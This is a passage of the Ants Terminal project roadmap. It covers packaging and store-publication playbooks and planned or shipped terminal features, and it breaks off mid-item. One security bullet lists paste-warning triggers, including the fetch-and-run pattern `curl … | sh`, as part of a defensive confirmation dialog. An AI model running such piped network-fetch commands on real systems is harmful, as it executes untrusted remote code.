<!-- ants-roadmap-format: 1 -->
# Ants Terminal — Roadmap

> **Current version:** 0.7.56 (2026-04-30). See [CHANGELOG.md](CHANGELOG.md)
> for what's shipped; see [PLUGINS.md](PLUGINS.md) for plugin-author
> standards; this document covers what's **planned**.
>
> **Format:** v1 — see
> [docs/standards/roadmap-format.md](docs/standards/roadmap-format.md).
> Every actionable bullet carries a stable `[ANTS-NNNN]` ID; ID is
> identity, position is priority, items are tackled top-to-bottom.

This roadmap is organized by **target release**, and within each release by
**theme**. Every item has prior art and a one-line implementation note so
it's actionable — not aspirational. Dates are targets, not commitments;
they move based on contributor bandwidth and real-world usage feedback.

**Legend**
- ✅ Done (shipped)
- 🚧 In progress (branch or open PR)
- 📋 Planned (next up for this release)
- 💭 Considered (research phase; may change scope or slip)

**Themes**
- 🎨 **Features** — user-visible capabilities
- ⚡ **Performance** — runtime cost reductions
- 🔌 **Plugins** — extensibility surface
- 🖥 **Platform** — ports (macOS, Windows), Wayland native support, a11y
- 🔒 **Security** — attack-surface reductions
- 🧰 **Dev experience** — tooling, testing, docs
- 📦 **Packaging & distribution** — the work of getting Ants into distros
  as an installable, auditable, default-able terminal. See the
  [distribution-adoption overview](#distribution-adoption-overview) for
  the full multi-release plan.

---

## Distribution-adoption overview

Becoming a distribution's **default** terminal is a long game — every
mainstream default is built by the desktop-environment team itself
(Konsole/KDE, gnome-terminal/GNOME). Outside projects like Ghostty,
WezTerm, Kitty, Alacritty are widely **packaged** but not default
anywhere. Our realistic target is: **get packaged everywhere, accrue
the quality signals distros look for, and let small/niche distros
adopt first.** The work is tracked below under the 📦 theme in each
release; this section is the rollup so nothing falls by the wayside.

| Bundle | What ships | Status | Target release |
|--------|------------|--------|----------------|
| **H1** | `SECURITY.md` coordinated-disclosure policy, `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1) | ✅ | 0.6.16 |
| **H2** | AppStream `org.ants.Terminal.metainfo.xml`, polished desktop entry (`org.ants.Terminal.desktop`), icon install rules | ✅ | 0.6.17 |
| **H3** | Man page `ants-terminal.1` + CMake install rule | ✅ | 0.6.18 |
| **H4** | Bash / zsh / fish completions + CMake install rules | ✅ | 0.6.19 |
| **H5** | openSUSE OBS `.spec`, Arch AUR `PKGBUILD`, Debian `debian/` tree — ready-to-submit packaging files committed to tree | ✅ | 0.6.20 |
| **H6** | Flatpak manifest (`org.ants.Terminal.yml`) + host-shell wiring | ✅ | 0.7.2 |
| **H6.1** | Lua 5.4 module in Flatpak manifest so plugins work inside the sandbox | ✅ | 0.7.3 |
| **H6.2** | Flathub submission — PR `org.ants.Terminal` against `flathub/flathub` | 📋 | 0.8.0 |
| **H7** | Project website + docs site (GitHub Pages) with screenshots, getting-started, plugin authoring | 📋 | 0.8.0 |
| **H8** | macOS port (Qt6 builds cleanly; need `posix_spawn`/`openpty` + NSWindow observer + notarized `.app`) | 📋 | 0.9.0 |
| **H9** | AT-SPI / ATK accessibility — `QAccessibleInterface` for `TerminalWidget`, `text-changed` events batched on OSC 133 D | 📋 | 0.9.0 |
| **H10** | i18n scaffolding — `lupdate`/`linguist` flow, `tr()` on UI strings, `.qm` files for en/es/fr/de | 📋 | 0.9.0 |
| **H11** | Reproducible-build verification + SBOM (`cmake --build` under `SOURCE_DATE_EPOCH`; generate SPDX SBOM) | 💭 | 0.9.0 |
| **H12** | Windows port (ConPTY + Qt6 Windows plugin; sign + MSI) | 💭 | Beyond 1.0 |
| **H13** | Distro-outreach pitch: file "intent-to-package" bugs in Debian / Fedora / NixOS; write launch post for r/linux, Hacker News, Phoronix tip line, LWN | 📋 | 0.8.0 |
| **H14** | Grow bus factor ≥ 2: second maintainer with commit rights, documented governance | 💭 | 1.0.0+ |
| **H15** | FOSDEM lightning talk / devroom slot (Linux desktop devroom is where distro maintainers converge) | 💭 | Beyond 1.0 |
| **H16** | Sponsorship / funding: GitHub Sponsors, Open Collective, or similar | 💭 | Beyond 1.0 |

Already shipped (as of this ROADMAP revision):

- ✅ **`.desktop` file** — pre-0.5 ancestor preserved as
  `ants-terminal.desktop.in` for the dev-symlink workflow; 0.6.17
  adds a spec-compliant `packaging/linux/org.ants.Terminal.desktop`
  for distro installs
- ✅ **Icons at multiple sizes** — `assets/ants-terminal-{16,32,48,64,128,256}.png`,
  installed under `share/icons/hicolor/<size>x<size>/apps/ants-terminal.png`
  by 0.6.17's CMake rules
- ✅ **CHANGELOG.md + SemVer discipline** — every release has a dated section with categorical bullets
- ✅ **CI with ASan + UBSan** — the `build-asan` lane runs sanitized ctest + binary smoke on every push
- ✅ **Audit pipeline** — clazy + cppcheck + grep rules + fixture-enforced regression coverage

Gating items (blocks adoption **today**, not just for being default):

1. **No distro packages anywhere** — H5 + H6 unblock this.
2. ~~**No AppStream metadata** — H2 unblocks GNOME Software / KDE Discover discovery.~~ ✅ Shipped in 0.6.17.
3. ~~**No SECURITY.md** — H1. Distro security teams need a disclosure contact before shipping.~~ ✅ Shipped in 0.6.16.
4. **Linux-only** + ~~**X11-only dropdown**~~ — H8 (macOS) widens the addressable audience; Wayland-native Quake positioning + global-hotkey registration both shipped (0.6.38 + 0.6.39).

---

## Per-store publication playbook

The H-bundle table above tracks **preparation** work (the files that
need to exist in-tree). This section tracks **submission** work —
getting the prepared package actually **live** in each store's
listing. Each store has its own review cadence, ingestion format,
and maintainer expectations, so they're broken out as discrete items
with step-by-step playbooks.

Stores are ordered by **ease of publish × reach**: Flathub + AUR
first (high reach, low friction), official distro archives last
(highest friction, longest lead time). A store is considered
"shipped" when `ants-terminal` installs from the stock package
manager without extra repository configuration.

| Store | Format | Prep status | Publish status | Target release |
|-------|--------|-------------|----------------|----------------|
| **P1 — Flathub** | Flatpak | ✅ manifest + Lua module (H6, H6.1) | 📋 submit `org.ants.Terminal` to `flathub/flathub` (H6.2) | 0.8.0 |
| **P2 — AUR (Arch User Repository)** | PKGBUILD | ✅ recipe (H5) | 📋 push to `aur.archlinux.org/packages/ants-terminal.git` + `-git` variant | 0.8.0 |
| **P3 — openSUSE OBS (home:ants-terminal)** | RPM spec | ✅ spec (H5) | 📋 upload to Open Build Service `home:` project, then target Tumbleweed / Leap repos | 0.8.0 |
| **P4 — Fedora COPR** | RPM spec | ✅ spec (H5) | 📋 create `ants-terminal` COPR; later submit package review for `fedora-extras` | 0.8.0 |
| **P5 — Debian / Ubuntu PPA** | deb source | ✅ debian/ tree (H5) | 📋 upload signed source package to Launchpad PPA | 0.8.0 |
| **P6 — Snap Store (snapcraft.io)** | snapcraft.yaml | 📋 write `snap/snapcraft.yaml`, host-shell model like Flatpak | 📋 register `ants-terminal` snap name + publish via `snapcraft upload` | 0.9.0 |
| **P7 — AppImage** | AppImage | 🚧 [`.github/workflows/release.yml`](.github/workflows/release.yml) — linuxdeploy + qt plugin on Ubuntu 22.04 (glibc 2.35) | 🚧 publishing on tag push to GitHub Releases (first build: 0.7.42) | 0.7.42+ |
| **P8 — Nixpkgs (NixOS)** | nix expression | 📋 write `pkgs/applications/terminal-emulators/ants-terminal/default.nix` | 📋 open PR against `NixOS/nixpkgs` master | 0.9.0 |
| **P9 — Debian (main archive)** | deb, official | 📋 RFP → ITP → sponsored upload → new-queue review | 📋 file ITP bug, find DM sponsor | 1.0.0+ |
| **P10 — Ubuntu (universe, via Debian)** | deb | Auto-sync from Debian unstable | 📋 rides on P9 | 1.0.0+ |
| **P11 — Fedora (official, via Bodhi)** | RPM | 📋 package review bug → sponsor → Bodhi updates | 📋 rides on P4 quality signals | 1.0.0+ |
| **P12 — Arch extra** | PKGBUILD, trusted | Would need TU sponsorship and high AUR install count | 💭 not a goal until reach justifies it | 1.0.0+ |

### P1 — Flathub submission

**Prerequisites:** H6 ✅, H6.1 ✅, H6.2 in-tree prep ✅ (screenshots,
`make-flathub-manifest.sh`, FLATHUB.md playbook).
**Blocker:** real-user shakedown of the 0.7.3 Flatpak before claiming
the Flathub repo name.

1. **Tag the release.** `git tag -s v<version>; git push --tags`.
2. **Regenerate the tag-pinned manifest:**
   `packaging/flatpak/make-flathub-manifest.sh v<version> >
   /tmp/org.ants.Terminal.yml`.
3. **Fork [flathub/flathub](https://github.com/flathub/flathub).**
   In the fork, create a **new repo**
   `flathub/org.ants.Terminal` per the Flathub "Submit via a new
   repo" flow
   (https://docs.flathub.org/docs/for-app-authors/submission/).
4. **Populate the repo** with the generated manifest, a copy of
   `org.ants.Terminal.metainfo.xml` (from `packaging/linux/`), and
   a copy of `org.ants.Terminal.desktop`. Pin `branch: stable` in the
   manifest so Flathub CI builds against our stable branch.
5. **Open a PR** from `flathub/org.ants.Terminal` against
   `flathub/flathub` with the repo URL in the PR body. Flathub CI
   rebuilds on each push.
6. **Respond to review comments** (typical first-review: shrink
   `finish-args` surface, confirm the `flatpak-external-data-checker`
   stanza updates without manual intervention).
7. **On merge,** Flathub publishes automatically. `flatpak install
   flathub org.ants.Terminal` is the smoke test.
8. **Post-merge maintenance:** each new `v<version>` tag requires a
   manifest PR against `flathub/org.ants.Terminal` pointing to the
   new tag (single script invocation — `make-flathub-manifest.sh
   v<new>` → commit → PR). Flathub CI handles the Lua-tarball hash
   refresh on its own via `x-checker-data`.
9. **Flip the gating-item entry:** "No distro packages anywhere" →
   "unblocked via Flathub."

### P2 — AUR publish

**Prerequisites:** H5 ✅ (`packaging/archlinux/PKGBUILD` in tree).
**Blocker:** need an `aur.archlinux.org` maintainer account and an
SSH key registered there.

1. **Create the `ants-terminal` AUR page** via `git clone
   ssh://aur@aur.archlinux.org/ants-terminal.git` (empty repo created
   on first push).
2. **Copy `packaging/archlinux/PKGBUILD`** into the checkout, along
   with a generated `.SRCINFO` (`makepkg --printsrcinfo > .SRCINFO`).
3. **Refresh the tarball hash:** `updpkgsums` resolves the
   `sha256sums=('SKIP')` placeholder against the GitHub tag.
4. **Push** — the AUR git hook publishes immediately. No review
   queue.
5. **Repeat for the `-git` rolling variant:** second repo
   `ants-terminal-git` with the three-line diff documented in
   `packaging/README.md` (`pkgname`, `source`, `pkgver()`).
6. **Maintenance per release:** `updpkgsums && makepkg --printsrcinfo
   > .SRCINFO && git commit && git push`. Script candidate:
   `scripts/publish-aur.sh`.

### P3 — openSUSE Build Service (OBS)

**Prerequisites:** H5 ✅ (`packaging/opensuse/ants-terminal.spec`).
**Blocker:** `openSUSE Build Service` account
(`build.opensuse.org`).

1. **Log in to OBS** and create a `home:<username>:ants-terminal`
   project.
2. **`osc mkpac ants-terminal`** inside the project; drop in
   `ants-terminal.spec`, the source tarball reference, and a
   `.changes` file mirroring CHANGELOG.md in OBS's expected format.
3. **`osc build`** locally against Tumbleweed to catch build
   errors before upload. Then `osc commit`.
4. **OBS auto-builds** against Tumbleweed, Leap 15.x, and any other
   repos added to the project. Results visible at
   `build.opensuse.org/package/show/home:<username>:ants-terminal/ants-terminal`.
5. **Publish to stable repositories:** after green builds, submit a
   `submitrequest` to `devel:languages:misc` (or a dedicated devel
   project). Once accepted, package enters the distro review queue
   for inclusion in the next Tumbleweed / Leap repos.
6. **One-click-install URL:** OBS auto-generates
   `software.opensuse.org/package/ants-terminal` pages for discovery.

### P4 — Fedora COPR

**Prerequisites:** H5 ✅ (spec is Fedora-compatible — uses `%cmake`
macros that work on both Fedora and openSUSE).
**Blocker:** Fedora Account System (FAS) account.

1. **Create a COPR project** at `copr.fedorainfracloud.org/coprs/`
   with Fedora 40/41/42/rawhide chroots enabled.
2. **Upload the spec** via `copr-cli build <project>
   /path/to/ants-terminal.spec` (or sync the GitHub repo with COPR's
   `custom build` webhook for auto-rebuild on tag push).
3. **Smoke-test:** `sudo dnf copr enable <username>/ants-terminal &&
   sudo dnf install ants-terminal`.
4. **Later — submit a package review** against the `Package Reviews`
   Bugzilla product for inclusion in `fedora-extras`. This is the
   start of the Fedora official-archive path (P11).

### P5 — Debian / Ubuntu PPA (Launchpad)

**Prerequisites:** H5 ✅ (`packaging/debian/` tree).
**Blocker:** Launchpad account + a PGP signing key registered there.

1. **Create a PPA** at `launchpad.net/~<user>/+archive/ubuntu/ants-terminal`.
2. **Build a signed source package locally:** `debuild -S -sa` from
   the project root (the debian/ tree is at `packaging/debian/`, so
   symlink or copy it to `./debian/` first).
3. **Upload:** `dput ppa:<user>/ants-terminal
   ../ants-terminal_<version>-1_source.changes`. Launchpad rebuilds
   for each supported Ubuntu series (jammy / noble / oracular).
4. **Smoke-test:** `sudo add-apt-repository ppa:<user>/ants-terminal
   && sudo apt update && sudo apt install ants-terminal`.
5. **Backports note:** Debian users can install the same `.deb`
   directly — Ubuntu PPAs work as a generic Debian-family archive
   when users add the sources.list line manually.

### P6 — Snap Store

**Prerequisites:** write `snap/snapcraft.yaml`, which does NOT
exist yet. Host-shell model similar to our Flatpak approach.

1. **Write `snap/snapcraft.yaml`** targeting `core24`, `confinement:
   strict`, with `plugs:` for `home`, `network`, `wayland`,
   `desktop`, `desktop-legacy`, `opengl`, `pulseaudio`,
   `gsettings`. PTY path mirrors the Flatpak host-shell wiring
   (see `ptyhandler.cpp`'s `FLATPAK_ID` branch — needs a parallel
   `SNAP` branch).
2. **Test locally:** `snapcraft pack` + `sudo snap install
   --dangerous ants-terminal_<version>_amd64.snap`.
3. **Register the name:** `snapcraft register ants-terminal`.
4. **Upload:** `snapcraft upload ants-terminal_<version>_amd64.snap
   --release=stable`. Review by Snap Store is typically hours to
   days on first submission (manual review for `strict`
   confinement + `home` plug), then auto-approved for revisions.
5. **Ongoing:** `snapcraft.io` GitHub builder hooks auto-rebuild
   on tag push — no per-release manual work after the initial
   submission.

### P7 — AppImage

**Status:** 🚧 First binary shipped with v0.7.42. Recipe lives at
[`.github/workflows/release.yml`](.github/workflows/release.yml) — fires on
every `v*` tag push (and via `workflow_dispatch` for backfilling).
Output is `Ants_Terminal-<version>-x86_64.AppImage`, attached to the
matching GitHub Release. Build runs on Ubuntu 22.04 for glibc-2.35
compatibility (covers Debian 12+, Ubuntu 22.04+, Fedora 36+, openSUSE
Tumbleweed, Arch). linuxdeploy + linuxdeploy-plugin-qt bundle Qt6 and
liblua5.4 automatically; `--appimage-extract-and-run --version` /
`--help` smoke tests gate the upload step.

**Done:**

1. ✅ **Tool chosen:** `linuxdeploy` + `linuxdeploy-plugin-qt` (the
   Qt6 standard).
2. ✅ **CI lane added:** `.github/workflows/release.yml`. Replaces the
   originally-planned `.github/workflows/appimage.yml` filename — same
   shape, but the file is named for what it does (release artefacts,
   plural future-proofing) rather than the artefact type.

**Open follow-ups:**

3. 📋 **Publish to AppImageHub** (`appimage.github.io`) — open a PR
   with a YAML metadata stub pointing at our GitHub Release artefact.
   AppImageHub is a listing directory, not a store — increases
   discoverability for Linux desktop users browsing for terminals.
4. ✅ **Auto-update** via [AppImageUpdate](https://github.com/AppImage/AppImageUpdate)
   — shipped 0.7.46. The build workflow embeds a `gh-releases-zsync`
   update-info string in the AppImage and uploads a `.zsync` sidecar
   alongside; in-app the update notifier's click handler runs
   `AppImageUpdate` (GUI) or `appimageupdatetool` (CLI) detached
   when the binary is running as an AppImage, falling back to
   opening the release page in a browser otherwise. v0.7.46 is the
   first release whose binary can be updated in place; pre-0.7.46
   shipped without the metadata and remain manual-download only.
5. 💭 **aarch64 AppImage** — second runner job once GitHub Actions
   `ubuntu-22.04-arm64` is GA (currently in preview). Niche but
   meaningful for Asahi Linux + Pi 5 + AWS Graviton dev boxes.

### P8 — Nixpkgs

**Prerequisites:** write the nix expression. Not yet started.

1. **Fork `NixOS/nixpkgs`.**
2. **Add `pkgs/applications/terminal-emulators/ants-terminal/default.nix`**
   with `mkDerivation` using `cmake`, `qt6.qtbase`,
   `qt6.qtwayland`, `qt6.qtopengl`, `lua5_4`, etc. Pin
   `src = fetchFromGitHub { … rev = "v<version>"; hash = "sha256-…"; }`.
3. **Wire it in `pkgs/top-level/all-packages.nix`.**
4. **Smoke-test:** `nix-build -A ants-terminal` in the fork.
5. **Open PR** against `NixOS/nixpkgs`. First-submission reviews
   are thorough (style, dependency minimization, `meta` fields);
   budget 1–4 weeks of review cycles.
6. **On merge,** `nix profile install nixpkgs#ants-terminal` works
   for every NixOS + non-NixOS Nix user.

### P9 — Debian (official archive)

**Prerequisites:** P5 working, plus a Debian Developer (DD) sponsor.
Longest lead time of any store.

1. **File an RFP** (Request For Packaging) bug against
   `wnpp` pseudo-package in Debian BTS.
2. **Work with a sponsor** (DD or DM) to iteratively polish the
   packaging (lintian clean, copyright audit, build on buildd
   network). Our `packaging/debian/` tree is a starting point —
   expect several rounds of refinement.
3. **ITP** (Intent To Package): once polished, the sponsor files
   an ITP bug and uploads the source package via their credentials.
4. **New-queue review:** ftpmaster manually reviews the initial
   upload for license + standards compliance. First-time uploads
   can sit in new-queue for weeks.
5. **After acceptance:** subsequent versions go through normal
   sponsor-upload flow (still requires DD involvement) until I apply
   for DM status (2-year typical timeline).

### P10 — Ubuntu (via Debian)

Rides on P9. Debian unstable auto-syncs to the next Ubuntu dev
release; Ubuntu-specific patches generally aren't needed for a
terminal emulator.

### P11 — Fedora (official archive)

Rides on P4 track record. Submit package review against
`fedora-extras`; once approved, package lands in Fedora rawhide and
follows normal Bodhi update flow into stable releases.

### P12 — Arch extra

Requires Arch Trusted User (TU) sponsorship. Not a near-term goal;
AUR (P2) is the standard Arch path and serves the Arch community
adequately.

---

## Table of Contents

1. [Distribution-adoption overview](#distribution-adoption-overview)
2. [0.5.0 — shipped](#050--shipped-2026-04-13)
3. [0.6.0 — shipped](#060--shipped-2026-04-14)
4. [0.7.0 — shell integration + triggers](#070--shell-integration--triggers-target-2026-06)
5. [0.7.12 — independent-review sweep](#0712--independent-review-sweep-target-2026-05)
6. [0.8.0 — multiplexing + marketplace](#080--multiplexing--marketplace-target-2026-08)
7. [0.9.0 — platform + a11y](#090--platform--a11y-target-2026-10)
8. [1.0.0 — stability milestone](#100--stability-milestone-target-2026-12)
9. [Beyond 1.0 — long-horizon](#beyond-10--long-horizon)
10. [How to propose a roadmap item](#how-to-propose-a-roadmap-item)

---

## 0.5.0 — shipped (2026-04-13)

Reference point — see [CHANGELOG.md](CHANGELOG.md#050--2026-04-13) for the
full list. Headline: **context-aware Project Audit** (inline suppressions,
generated-file skip, path rules, code snippets, git blame enrichment,
confidence score 0–100, Semgrep integration, AI triage per finding,
version stamping on every export).

---

## 0.6.0 — shipped (2026-04-14)

**Theme of the release:** make the two features that already make Ants
distinctive (plugins + audit) production-grade. No sprawl; polish what's
there before adding a multiplexer. Reference:
[CHANGELOG.md §0.6.0](CHANGELOG.md#060--2026-04-14).

### 🎨 Features

- ✅ **Scrollback regex search**. `Ctrl+Shift+F` floating bar with
  three toggles — `.*` (regex), `Aa` (case), `Ab` (whole word,
  Alt+R/C/W) — plus match counter, next/prev jump, all-match
  highlight overlay, current-match accent, invalid-pattern feedback.
  Ghostty 1.3 parity.
- ✅ **OSC 9;4 progress reporting**. Parses
  `ESC ] 9 ; 4 ; state ; pct ST` (ConEmu / Microsoft Terminal), renders
  a thin colored strip along the bottom edge plus a tab-icon dot.
- ✅ **Click-to-move-cursor on shell prompts** (previously in code;
  docs promoted).
- 💭 [ANTS-1001] **Kitty Unicode-placeholder graphics** (U+10EEEE + diacritics).
  Moved to 0.7 backlog — scope-wise a standalone item, not a blocker.

### 🔌 Plugins — manifest v2 + capability model

- ✅ **Declarative permissions in `manifest.json`** — `permissions`
  array with first-load confirmation dialog, persisted per-plugin grants
  in `config.json` (`plugin_grants`). Un-granted permissions = missing
  API functions (not `nil` stubs) so plugins can feature-detect.
- ✅ **Per-plugin Lua VMs** — each plugin gets its own `lua_State`,
  10 MB heap budget, 10 M instruction hook. `PluginManager` fans
  events out over all loaded VMs.
- ✅ **`ants.settings.get / .set`** — gated by `"settings"`. Backed by
  `config.json`'s `plugin_settings.<name>.<key>`. Settings-dialog
  auto-render of `"settings_schema"` is follow-up (API + store in
  place).
- ✅ **`ants.clipboard.write(text)`** — gated by `"clipboard.write"`.
- ✅ **Hot reload** via `QFileSystemWatcher` on `init.lua` /
  `manifest.json` / plugin dir. Fires `load` / `unload` lifecycle
  events. Enabled only when `ANTS_PLUGIN_DEV=1`.
- ✅ **Plugin keybindings** — `manifest.json` `"keybindings":
  {"action-id": "Ctrl+Shift+X"}` block. Firing the shortcut sends a
  `keybinding` event to the owning plugin.
- ✅ **`ants._version`** + **`ants._plugin_name`** exposed.

### ⚡ Performance

- ✅ **LRU glyph-atlas eviction**. Per-glyph `lastFrame` counter,
  warm-half retention on overflow, median-based fallback. See
  `glrenderer.cpp:compactAtlas`.
- ✅ **Per-line dirty tracking** (partial). `TermLine::dirty` set by
  grid mutations; `TerminalWidget::invalidateSpanCaches()` does
  targeted eviction of URL / highlight caches. Full cell-level
  render-path partial-update remains as future work — primitive is in
  place.
- 💭 [ANTS-1002] **EGL_EXT_swap_buffers_with_damage + EGL_EXT_buffer_age** on the GL
  path. Deferred — narrow Mesa-only win, revisit in 0.9 platform pass.

### 🔒 Security

- ✅ **Multi-line paste confirmation**. Dialog on `\n` / `sudo ` /
  `curl … | sh` / control chars. Policy independent of bracketed-paste
  mode. Config key `confirm_multiline_paste` (default on).
- ✅ **Per-terminal OSC 52 write quota**: 32 writes/min + 1 MB/min
  (independent of the 1 MB per-string cap).
- ✅ **OSC 8 homograph warning**: when visible label's hostname ≠
  URL host, a confirm dialog shows both and requires opt-in.

### 🧰 Dev experience

- ✅ **`ants-terminal --new-plugin <name>`** — scaffolds init.lua /
  manifest.json / README.md from templates. Name validated against
  `[A-Za-z][A-Za-z0-9_-]{0,63}`.
- ✅ **`ANTS_PLUGIN_DEV=1`** — verbose logging on plugin scan/load,
  plus hot reload.
- ✅ **`--help` / `--version`** CLI flags wired via
  `QCommandLineParser`.

---

## 0.7.0 — shell integration + triggers (target: 2026-06)

**Theme:** make Ants the best terminal for **shell-aware workflows**.

### 🎨 Features — shell integration beyond OSC 133

- ✅ **Command blocks as first-class UI** (Warp parity,
  [docs](https://docs.warp.dev/terminal/blocks)). Shipped across
  several releases and consolidated in 0.6.10. Prompt → command →
  output grouping via `OSC 133` markers, `Ctrl+Shift+Up` /
  `Ctrl+Shift+Down` jump-to-prev/next prompt, collapsible output with
  "… N lines hidden" summary bar, duration + timestamp in the prompt
  gutter, 2px pass/fail status stripe, and per-block right-click
  menu: Copy Command, Copy Output, Re-run Command, Fold/Unfold,
  Share Block as `.cast`. "Suppress output noise" is deferred — the
  original sub-bullet didn't define a noise heuristic and wasn't
  worth blocking the bundle. See
  [CHANGELOG.md §0.6.10](CHANGELOG.md#0610--2026-04-14).
- ✅ **Asciinema recording** (`.cast` v2 format,
  [spec](https://docs.asciinema.org/manual/asciicast/v2/)). Shipped.
  Full-session recording via `Settings → Record Session` (default
  `Ctrl+Shift+R`); per-block export via the command-block context
  menu in 0.6.10. Asciicast v2 header + event-stream format. See
  [CHANGELOG.md §0.6.10](CHANGELOG.md#0610--2026-04-14).
- ✅ **Semantic history**. Shipped in 0.6.x and broadened in 0.6.12.
  Ctrl-click on a `path:line:col` capture in scrollback (compiler /
  linter / stack-trace output) opens the file at the cited line/col
  via `TerminalWidget::openFileAtPath()`. Detection lives in
  `detectUrls()` (regex captures `path:line[:col]`); CWD resolution
  uses `/proc/<pid>/cwd` so relative paths Just Work without shell
  cooperation. 0.6.12 broadened the editor switch from VS Code + Kate
  only to also cover the VS Code family (`code-insiders`, `codium`),
  vi-family (`nvim`, `vim`), `nano`, Sublime / Helix / Micro
  (`path:line:col` argv shape), and JetBrains IDEs (`--line N
  --column M`). See
  [CHANGELOG.md §0.6.12](CHANGELOG.md#0612--2026-04-14).
- ✅ **Shell-side HMAC verification** for OSC 133 markers. Shipped in
  0.6.31. When `$ANTS_OSC133_KEY` is set in the terminal's environment,
  every OSC 133 marker (`A`/`B`/`C`/`D`) must carry an `ahmac=` param
  computed as HMAC-SHA256(key, `<marker>|<promptId>[|<exitCode>]`).
  Markers without a valid HMAC are dropped and a forgery counter
  increments, surfaced as a status-bar warning with a 5-second
  cooldown. Bash + zsh hook scripts ship under
  `packaging/shell-integration/`. Headless feature test
  (`tests/features/osc133_hmac_verification/`) covers verifier OFF
  back-compatibility, verifier ON accept of valid HMACs (including
  uppercase-hex), and rejection of missing/wrong/promptId-mismatched/
  exit-code-mismatched HMACs. See
  [CHANGELOG.md §0.6.31](CHANGELOG.md#0631--2026-04-17).

### 🔌 Plugins — trigger system

- ✅ **Trigger rules** with `instant` flag and the full iTerm2 action
  set — `bell`, `inject`, `run_script`, `notify`, `sound`, `command`
  shipped in 0.6.9; the three deferred grid-mutation actions
  `highlight_line`, `highlight_text`, and `make_hyperlink` shipped in
  0.6.13 via a new `TerminalGrid` line-completion callback so matches
  map to exact col ranges on a real row before the row scrolls into
  scrollback. Full parity with the iTerm2 trigger doc. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14) and
  [CHANGELOG.md §0.6.13](CHANGELOG.md#0613--2026-04-14).
- ✅ **User-vars channel**: OSC 1337 SetUserVar parsing + the
  `user_var_changed` event. Shipped in 0.6.9. Disambiguated from
  inline images by the byte after `1337;`. NAME ≤ 128 chars; decoded
  value capped at 4 KiB. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).
- ✅ **Command-palette registration**: `ants.palette.register({title,
  action, hotkey})` shipped in 0.6.9. Always-on (no permission gate),
  optional global QShortcut. Entry triggers fire scoped
  `palette_action` event. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).
- ✅ Events: `command_finished` (exit + duration), `pane_focused`,
  `theme_changed`, `window_config_reloaded`, `user_var_changed`,
  `palette_action`. All shipped in 0.6.9. See
  [CHANGELOG.md §0.6.9](CHANGELOG.md#069--2026-04-14).

### ⚡ Performance

- ✅ **SIMD VT-parser scan**. Shipped in 0.6.23. Ground-state hot path
  now scans 16 bytes at a time via SSE2 (x86_64) / NEON (ARM64) for
  the next non-printable-ASCII byte, then bulk-emits `Print` actions
  for the safe run without running the full state machine. A signed-
  compare trick (XOR 0x80 → two `cmpgt_epi8` against pre-computed
  bounds) flags any interesting byte with one `movemask`. Regression
  guard: `tests/features/vtparser_simd_scan/` asserts byte-identical
  action streams across whole-buffer, byte-by-byte, and pseudo-random-
  chunk feeds over a 38-case corpus covering every offset-mod-16
  alignment for the scan boundary. See
  [CHANGELOG.md §0.6.23](CHANGELOG.md#0623--2026-04-15).
- ✅ **Decouple read/parse/render thread**. Shipped in 0.6.34. PTY read
  and VT parse now run on a dedicated worker QThread (`VtStream`);
  parsed `VtAction` batches are shipped to the GUI over a
  `Qt::QueuedConnection` and applied to `TerminalGrid` there, so paint
  stays on the main thread. Back-pressure: at most 8 batches in flight
  (≈128 KB of unprocessed PTY bytes) before the worker disables its
  `QSocketNotifier` and lets the kernel apply flow control to the
  child; GUI re-enables on drain. PTY writes (keystrokes, DA/CPR/OSC 52
  responses) cross back to the worker via
  `QMetaObject::invokeMethod(... Qt::QueuedConnection)`. Resize goes
  through `Qt::BlockingQueuedConnection` so the PTY winsize is updated
  before the next paint. The `ANTS_SINGLE_THREADED=1` kill-switch was
  retired in 0.6.37 once the new path proved out in the wild (0.6.34
  → 0.6.37 bake period) and the legacy single-threaded code paths were
  deleted. Four feature tests lock the invariants: parse equivalence
  across 11 fixtures × 6 chunking strategies, response ordering, the
  source-level resize-synchronicity contract, and the ptyWrite-gating
  regression pin. See
  [CHANGELOG.md §0.6.34](CHANGELOG.md#0634--2026-04-18) and
  [§0.6.37](CHANGELOG.md#0637--2026-04-18).
- ✅ **Incremental reflow on resize**. Shipped in 0.6.15. The original
  research note called for tracking `wrap_col` per line; the actual
  implementation works on equivalent information already on the line
  (`softWrapped` flag + a single-pass content-width check): standalone
  lines that fit the new width get an in-place `cells.resize()` with
  default-attr padding or trailing-blank trim, skipping the
  allocation-heavy `joinLogical` / `rewrap` round-trip. Multi-line
  soft-wrap sequences still go through the full logic so correctness
  is preserved. See
  [CHANGELOG.md §0.6.15](CHANGELOG.md#0615--2026-04-14).

### 🖥 Platform

- ✅ **Wayland-native Quake-mode** — shipped across two releases.
  Part 1 of 2 (0.6.38): `find_package(LayerShellQt CONFIG QUIET)` wires
  `LayerShellQt::Interface` when the `layer-shell-qt6-devel` package
  is installed, and `MainWindow::setupQuakeMode()` promotes the window
  to a `zwlr_layer_surface_v1` at `LayerTop`, anchored top/left/right
  with exclusive-zone 0. The dead `quake_hotkey` config key is wired
  to a `QShortcut` with `Qt::ApplicationShortcut` context. XCB path
  preserved for X11. Source-level invariants pinned in
  `tests/features/wayland_quake_mode/`.
  Part 2 of 2 (0.6.39): `GlobalShortcutsPortal` client wraps the
  Freedesktop `org.freedesktop.portal.GlobalShortcuts` handshake
  (CreateSession → session handle → BindShortcuts → Activated) behind
  a single Qt signal. `MainWindow` binds the `toggle-quake` id when
  the portal service is registered on the session bus (KDE Plasma 6,
  xdg-desktop-portal-hyprland, -wlr); on GNOME Shell the portal call
  fails and the in-app `QShortcut` fallback stays as the activation
  path. Both paths debounce via a 500 ms window to avoid focused
  double-fire. Replaces the originally-planned KGlobalAccel + GNOME
  D-Bus branching with one compositor-agnostic API. See
  [CHANGELOG.md §0.6.38](CHANGELOG.md#0638--2026-04-18) and
  [§0.6.39](CHANGELOG.md#0639--2026-04-18).

### 🔒 Security

- ✅ **Plugin capability audit UI**. Shipped in 0.6.11. Settings →
  **Plugins** lists every discovered plugin and renders each declared
  permission as a checkbox — checked = granted, unchecked = revoked.
  Revocations persist to `config.plugin_grants[<name>]` and take
  effect at next plugin reload (matches the first-load permission
  prompt's grant semantics). See
  [CHANGELOG.md §0.6.11](CHANGELOG.md#0611--2026-04-14).
- ✅ **Image-bomb defenses**. Shipped in 0.6.11. New
  `TerminalGrid::ImageBudget` tracks total decoded image bytes
